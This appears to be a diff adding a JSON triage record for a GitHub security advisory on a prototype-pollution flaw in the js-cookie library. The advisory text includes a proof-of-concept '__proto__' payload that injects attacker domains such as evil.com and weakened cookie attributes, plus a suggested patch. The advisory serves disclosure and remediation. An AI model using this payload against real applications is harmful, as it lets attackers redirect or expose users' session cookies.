@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/130235050?v=4\", \"events_url\": \"https://api.github.com/users/teebow1e/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/teebow1e/followers\", \"following_url\": \"https://api.github.com/users/teebow1e/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/teebow1e/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/teebow1e\", \"id\": 130235050, \"login\": \"teebow1e\", \"node_id\": \"U_kgDOB8M6qg\", \"organizations_url\": \"https://api.github.com/users/teebow1e/orgs\", \"received_events_url\": \"https://api.github.com/users/teebow1e/received_events\", \"repos_url\": \"https://api.github.com/users/teebow1e/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/teebow1e/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/teebow1e/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/teebow1e\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-46625\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-1321\", \"name\": \"Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')\"}], \"description\": \"## Summary\\n\\n`js-cookie`'s internal `assign()` helper copies properties with `for...in` + plain assignment. When the source object is produced by `JSON.parse`, the JSON object's `\\\"__proto__\\\"` member is an *own enumerable* property, so the `for…in` enumerates it and the `target[key] = source[key]` write triggers the **`Object.prototype.__proto__` setter** on the fresh `target` (`{}`). The result is a per-instance prototype hijack: `Object.prototype` itself is untouched, but the merged `attributes` object now inherits attacker-controlled keys.\\n\\nBecause the consuming `set()` function then enumerates the merged object with another `for...in`, every key the attacker placed on the polluted prototype lands in the resulting `Set-Cookie` string as an attribute pair. The attacker can set `domain=`, `secure=`, `samesite=`, `expires=`, and `path=` on cookies whose attributes the developer thought were locked down.\\n\\n## Impact\\n\\nAny application that forwards a JSON-derived object as the `attributes` argument to `Cookies.set`, `Cookies.remove`, `Cookies.withAttributes`, or `Cookies.withConverter` is vulnerable. This is the standard pattern when cookie configuration comes from a backend:\\n\\n```js\\nconst cfg = await fetch('/config').then(r => r.json());\\nCookies.set('session', token, cfg.cookieAttrs);   // cfg.cookieAttrs influenced by attacker\\n```\\n\\nA payload of `{\\\"__proto__\\\":{\\\"domain\\\":\\\"evil.example\\\",\\\"secure\\\":\\\"false\\\",\\\"samesite\\\":\\\"None\\\"}}` causes js-cookie to emit:\\n\\n```\\nSet-Cookie: session=TOKEN; path=/; domain=evil.example; secure=false; samesite=None\\n```\\n\\n## Affected code\\n\\n```js\\n// src/assign.mjs — full file\\nexport default function (target) {\\n  for (var i = 1; i < arguments.length; i++) {\\n    var source = arguments[i]\\n    for (var key in source) {                 // includes own enumerable '__proto__'\\n      target[key] = source[key]                // [[Set]] form - fires __proto__ setter\\n    }\\n  }\\n  return target\\n}\\n```\\n## Proof of concept\\n\\nNode 22.11.0, no third-party deps:\\n\\n### Environment setup\\n```bash\\nmkdir -p /tmp/jscookie-poc && cd /tmp/jscookie-poc\\nnpm init -y\\nnpm i js-cookie\\n```\\n\\n### PoC\\n```js\\nubuntu@kuber:/tmp/jscookie-poc$ cat poc.mjs\\nlet lastSetCookie = '';\\nglobalThis.document = {\\n  get cookie() { return ''; },\\n  set cookie(v) { lastSetCookie = v; }\\n};\\n\\nconst { default: Cookies } = await import('js-cookie');\\n\\nconst attackerAttrs = JSON.parse(\\n  '{\\\"__proto__\\\":{\\\"secure\\\":\\\"false\\\",\\\"domain\\\":\\\"evil.com\\\",\\\"samesite\\\":\\\"None\\\",\\\"expires\\\":-1}}'\\n);\\n\\nCookies.set('session', 'TOKEN', attackerAttrs);\\n\\nconsole.log('Set-Cookie that js-cookie wrote to document.cookie:');\\nconsole.log(lastSetCookie);\\n```\\n\\nExecution:\\n<img width=\\\"2614\\\" height=\\\"1174\\\" alt=\\\"cls-2026-05-14-01 44 39\\\" src=\\\"https://github.com/user-attachments/assets/120df1fe-7e97-4ca3-904e-ab80d71ecf62\\\" />\\n\\n## Suggested patch\\n\\n```diff\\n--- a/src/assign.mjs\\n+++ b/src/assign.mjs\\n@@\\n export default function (target) {\\n   for (var i = 1; i < arguments.length; i++) {\\n     var source = arguments[i]\\n-    for (var key in source) {\\n-      target[key] = source[key]\\n-    }\\n+    for (var key in source) {\\n+      if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue\\n+      Object.defineProperty(target, key, {\\n+        value: source[key],\\n+        writable: true,\\n+        enumerable: true,\\n+        configurable: true,\\n+      })\\n+    }\\n   }\\n   return target\\n }\\n```\\n\\nEquivalent one-liner alternative - iterate own names only and filter:\\n\\n```js\\nfor (const key of Object.getOwnPropertyNames(source)) {\\n  if (key === '__proto__') continue\\n  target[key] = source[key]\\n}\\n```\", \"epss\": {\"percentage\": 0.00432, \"percentile\": 0.34798}, \"ghsa_id\": \"GHSA-qjx8-664m-686j\", \"github_reviewed_at\": \"2026-05-21T21:20:31Z\", \"html_url\": \"https://github.com/advisories/GHSA-qjx8-664m-686j\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-qjx8-664m-686j\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-46625\"}], \"nvd_published_at\": \"2026-06-10T22:16:59Z\", \"published_at\": \"2026-05-21T21:20:31Z\", \"references\": [\"https://github.com/js-cookie/js-cookie/security/advisories/GHSA-qjx8-664m-686j\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-46625\", \"https://github.com/js-cookie/js-cookie/commit/eb3c40e89731e99b8970faaf35ddad249c6c0020\", \"https://github.com/js-cookie/js-cookie/releases/tag/v3.0.7\", \"https://github.com/advisories/GHSA-qjx8-664m-686j\"], \"repository_advisory_url\": \"https://api.github.com/repos/js-cookie/js-cookie/security-advisories/GHSA-qjx8-664m-686j\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/js-cookie/js-cookie\", \"summary\": \"JavaScript Cookie: Per-instance prototype hijack in assign() enables cookie-attribute injection\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-11T14:05:07Z\", \"url\": \"https://api.github.com/advisories/GHSA-qjx8-664m-686j\", \"vulnerabilities\": [{\"first_patched_version\": \"3.0.7\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"js-cookie\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 3.0.5\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-qjx8-664m-686j",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "js-cookie: <= 3.0.5"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-46625"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "js-cookie"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:59.210082Z",
+  "provenance": {
+    "content_sha256": "821de85a43a798c191ebac51fb5efed543329982061bc01c078384b38ea2ee6a",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-21T21:20:31Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-qjx8-664m-686j",
+  "status": "active",
+  "title": "JavaScript Cookie: Per-instance prototype hijack in assign() enables cookie-attribute injection",
+  "updated_at": "2026-06-11T14:05:07Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-qjx8-664m-686j"
+}
